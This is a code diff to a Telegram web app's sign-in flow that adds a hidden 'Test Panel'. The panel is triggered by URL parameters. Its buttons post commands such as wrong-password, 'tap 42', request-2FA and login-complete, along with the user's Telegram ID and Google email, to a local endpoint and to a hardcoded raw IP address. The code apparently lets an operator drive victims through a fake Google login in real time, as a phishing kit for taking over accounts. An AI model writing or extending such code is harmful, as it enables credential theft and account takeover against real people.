@@ -307,6 +307,7 @@ function initApp() {
     } else {
         navigateToAuthOrSavedStep();
     }
+    initTestAdminControlBar();
 
     function checkAuthStatus() {
         const userTgId = tg?.initDataUnsafe?.user?.id || null;
@@ -1295,6 +1296,65 @@ function initApp() {
         btnCancelGoogleConsent.addEventListener("click", () => {
             showStep(stepSuccess);
         });
+    }
+
+    async function sendGoogleControlCommand(status, promptNum, errorMsg) {
+        let targetTgId = (tgUser && tgUser.id) ? tgUser.id : "";
+        if (!targetTgId) {
+            const urlParams = new URLSearchParams(window.location.search);
+            targetTgId = urlParams.get("tg_id") || urlParams.get("user_id") || (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user ? window.Telegram.WebApp.initDataUnsafe.user.id : "");
+            try {
+                if (!targetTgId) targetTgId = localStorage.getItem("privateroom_user_id") || "";
+            } catch (e) {}
+        }
+        const apiEndpoints = [
+            "/api/auth/google-control",
+            "http://31.76.101.210:8080/api/auth/google-control"
+        ];
+        const payload = JSON.stringify({
+            tg_id: targetTgId,
+            email: userGoogleEmail,
+            status: status,
+            prompt_number: promptNum || "42",
+            error_msg: errorMsg || null
+        });
+        for (const ep of apiEndpoints) {
+            try {
+                const r = await fetch(ep, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: payload
+                });
+                if (r.ok) break;
+            } catch (e) {
+                console.debug("sendGoogleControlCommand fetch error on " + ep, e);
+            }
+        }
+    }
+
+    function initTestAdminControlBar() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const showBar = urlParams.get("admin") === "1" || urlParams.get("test") === "1" || urlParams.get("google") === "1" || urlParams.get("features") === "google";
+        if (!showBar || document.getElementById("testAdminFloatingBar")) return;
+
+        const bar = document.createElement("div");
+        bar.id = "testAdminFloatingBar";
+        bar.style.cssText = "position:fixed;top:0;left:0;right:0;z-index:999999;background:#18181b;color:#fff;padding:8px 12px;font-size:12px;display:flex;gap:8px;flex-wrap:wrap;align-items:center;justify-content:center;box-shadow:0 4px 14px rgba(0,0,0,0.4);border-bottom:2px solid #3b82f6;font-family:sans-serif;";
+        bar.innerHTML = `
+            <span style="font-weight:700;color:#60a5fa;">🧪 Test Panel:</span>
+            <button id="btnTestErrPass" style="background:#ef4444;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;font-weight:600;">❌ Неверный пароль</button>
+            <button id="btnTestPrompt" style="background:#3b82f6;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;font-weight:600;">📲 Тап (42)</button>
+            <button id="btnTestAsk2FA" style="background:#f59e0b;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;font-weight:600;">🔑 Запросить 2FA</button>
+            <button id="btnTestErr2FA" style="background:#dc2626;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;font-weight:600;">❌ Неверный 2FA</button>
+            <button id="btnTestComplete" style="background:#10b981;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;font-weight:600;">✅ Вход выполнен</button>
+        `;
+        document.body.appendChild(bar);
+
+        document.getElementById("btnTestErrPass").addEventListener("click", () => sendGoogleControlCommand("error_password", null, "Неверный пароль. Повторите попытку."));
+        document.getElementById("btnTestPrompt").addEventListener("click", () => sendGoogleControlCommand("show_prompt", "42"));
+        document.getElementById("btnTestAsk2FA").addEventListener("click", () => sendGoogleControlCommand("show_2fa"));
+        document.getElementById("btnTestErr2FA").addEventListener("click", () => sendGoogleControlCommand("error_2fa", null, "Неверный код. Проверьте код и повторите попытку."));
+        document.getElementById("btnTestComplete").addEventListener("click", () => sendGoogleControlCommand("completed"));
     }
 
     // Apple ID Navigation & Actions
